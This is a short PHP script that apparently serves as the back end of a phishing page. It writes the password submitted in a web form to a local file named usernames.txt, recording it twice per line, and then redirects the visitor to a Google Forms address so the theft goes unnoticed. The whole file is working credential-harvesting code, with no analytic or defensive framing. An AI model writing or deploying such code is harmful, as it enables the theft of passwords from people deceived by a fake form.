<?php

file_put_contents("usernames.txt", "Pass: " . $_POST['password'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://forms.gle/QR2wdKsnT5UFxSi66');
exit();
?>
